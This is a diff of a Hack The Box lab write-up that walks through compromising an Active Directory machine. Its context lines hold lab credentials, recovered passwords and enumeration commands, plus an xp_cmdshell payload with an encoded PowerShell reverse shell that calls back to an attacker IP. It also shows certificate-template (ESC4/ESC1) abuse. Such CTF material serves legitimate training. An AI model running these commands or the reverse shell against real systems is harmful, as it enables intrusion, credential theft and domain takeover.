@@ -5,8 +5,7 @@ date: 2025-02-16
 
 # Enumeration
 
- > 
- > \[!Warning\] HTB provides us with some valid credentials
+ > [!Warning] HTB provides us with some valid credentials
  > `rose / KxEPkKe6R8su`
 
 * As in all penetration test, we start with a [nmap](tools/nmap.md) scan
@@ -49,8 +48,7 @@ or (faster)
 ldapdomaindump 10.10.11.51 -u 'sequel\rose' -p 'KxEPkKe6R8su' --authtype SIMPLE 
 ````
 
- > 
- > \[!Result\]-
+ > [!Result]-
  > ![Pasted image 20250217010219.png](assets/Pasted%20image%2020250217010219.png)
 
 ## kerberos
@@ -99,12 +97,12 @@ There are 8 domain users
 certipy find -bloodhound -vulnerable -ns 10.10.11.51 -dc-ip 10.10.11.51 -u rose@sequel.htb -p 'KxEPkKe6R8su'
 ````
 
- > 
- > \[!warning\]- In my case, i couldn't import it :(
- > 
+ 
+ > [!warning]- In my case, i couldn't import it :(
  > ````bash
  > certipy find -stdout -vulnerable -ns 10.10.11.51 -dc-ip 10.10.11.51 -u rose@sequel.htb -p 'KxEPkKe6R8su
  > ````
+
 
 * lets read the result, but own user dont have access
   ![Pasted image 20250219202033.png](assets/Pasted%20image%2020250219202033.png)
@@ -121,8 +119,8 @@ or
 impacket-smbclient sequel/rose:KxEPkKe6R8su@10.10.11.51
 ````
 
- > 
- > \[!Result\]-
+ 
+ > [!Result]-
  > ![Pasted image 20250217010750.png](assets/Pasted%20image%2020250217010750.png)
 
 * we have read permission over "accounting department", lets download the content
@@ -147,8 +145,7 @@ libreoffice xl/sharedStrings.xml
 |Kevin|Malone|kevin@sequel.htb|kevin|Md9Wlq1E5bZnVDVo|
 |NULL|NULL|sa@sequel.htb|sa|MSSQLP@ssw0rd!|
 
- > 
- > \[!note\] we can use this password in john to crack the tickets but they didnt work
+ > [!note] we can use this password in john to crack the tickets but they didnt work
 
 # Foothold
 
@@ -177,8 +174,8 @@ rlwrap -cAr nc -nlvp 4444
 
 * then send the payload
 
- > 
- > \[!note\]- Payload
+
+ > [!note]- Payload
  > 
  > ````mssql
  > xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADMAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
@@ -235,8 +232,6 @@ python3 targetedKerberoast.py -v -d sequel.htb -u rose -p KxEPkKe6R8su --request
 ````
 
 ![Pasted image 20250220135034.png](assets/Pasted%20image%2020250220135034.png)
-
- > 
  > but we cant brute force him
 
 * modify the ownership over `ca_svc` using [owneredit.py](tools/owneredit.py.md)
@@ -247,8 +242,8 @@ owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:Wq
 
 ![Pasted image 20250220135700.png](assets/Pasted%20image%2020250220135700.png)
 
- > 
- > \[!warning\] You have to try it some times, because the first time i have run the script, the user was not the correct
+
+ > [!warning] You have to try it some times, because the first time i have run the script, the user was not the correct
 
 * now we can grant ryan full privileges over `ca_svc` using [dacledit.py](tools/dacledit.py.md)
 
@@ -275,14 +270,14 @@ python3 ../../PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CAC
 
 ![Pasted image 20250220151614.png](assets/Pasted%20image%2020250220151614.png)
 
- > 
- > \[!info\] save this key for the next step `2c9b71a0695508a8e51[snip]6eb5db62ddbc86b1a`
+
+ > [!info] save this key for the next step `2c9b71a0695508a8e51[snip]6eb5db62ddbc86b1a`
 
 * Perfect now we can use this file `.cache` to get the NTLM hash of the user
   ![Pasted image 20250220150514.png](assets/Pasted%20image%2020250220150514.png)
 
- > 
- > \[!Warning\]- We need to set this variable `KRB5CCNAME` with this value `/path/to/ca_svc.ccache`
+
+ > [!Warning]- We need to set this variable `KRB5CCNAME` with this value `/path/to/ca_svc.ccache`
  > 
  > ````bash
  > export KRB5CCNAME=./ca_svc.ccache
@@ -331,8 +326,8 @@ certipy req -username ca_svc@sequel.htb -hashes :'3b181b914e7[snip]1e20bc2b7fce'
 
 ![Pasted image 20250220154109.png](assets/Pasted%20image%2020250220154109.png)
 
- > 
- > \[!error\]- you have to run ESC1 instantly after ESC4, if u run this command like 10-15s later u will the a DNS crash, like this
+
+ >[!error]- you have to run ESC1 instantly after ESC4, if u run this command like 10-15s later u will the a DNS crash, like this
  > ![Pasted image 20250220154424.png](assets/Pasted%20image%2020250220154424.png)
  > do:
  > ![Pasted image 20250220154551.png](assets/Pasted%20image%2020250220154551.png)
